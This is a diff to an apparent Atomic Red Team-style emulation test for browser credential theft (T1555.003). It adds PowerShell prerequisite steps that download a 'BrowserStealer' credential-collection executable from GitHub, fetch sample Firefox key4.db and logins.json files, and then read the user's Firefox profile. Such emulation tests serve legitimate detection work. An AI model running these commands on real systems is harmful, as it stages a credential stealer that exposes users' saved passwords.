@@ -15,6 +15,28 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: |
+        Firefox must be on the device.
+      inline: |
+        if ((Test-Path "C:\Program Files\Mozilla Firefox\firefox.exe") -Or (Test-Path "C:\Program Files (x86)\Mozilla Firefox\firefox.exe")) {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        $installer = "PathToAtomicsFolder\..\ExternalPayloads\FirefoxStubInstaller.exe"
+        Invoke-WebRequest -OutFile $installer "https://download.mozilla.org/?product=firefox-stub&os=win&lang=en-US"
+        Start-Process -FilePath $installer -Wait
+        Stop-Process -Name "firefox"
+        }}
+      executor: powershell
+    - name: |
+        BrowserCollector must exist in the bin directory
+      inline: |
+        if (Test-Path "PathToAtomicsFolder\T1555.003\bin\BrowserCollector.exe") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\T1555.003\bin\" -ErrorAction Ignore -Force | Out-Null
+        Invoke-WebRequest "https://github.com/SaulBerrenson/BrowserStealer/releases/download/1.0.0.4/BrowserCollector_x64.exe" -Outfile: "PathToAtomicsFolder\T1555.003\bin\BrowserCollector.exe"}}
+      executor: powershell
+    - name: |
+        Login Data file that is a copy of a Firefox Login Data that contains credentials for the tool to "steal." Must exist at the specified path.
+      inline: |-
+        if (Test-Path "PathToAtomicsFolder\T1555.003\src\key4.db") {exit 0} else {{Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/src/key4.db?raw=true" -Outfile: "PathToAtomicsFolder\T1555.003\src\key4.db"
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/src/logins.json?raw=true" -Outfile: "PathToAtomicsFolder\T1555.003\src\logins.json" }}
+      executor: powershell
     - name: browserstealer-(chrome-/-firefox-/-microsoft-edge)
       inline: |
         $profile = (Gci -filter "*default-release*" -path $env:Appdata\Mozilla\Firefox\Profiles\).FullName
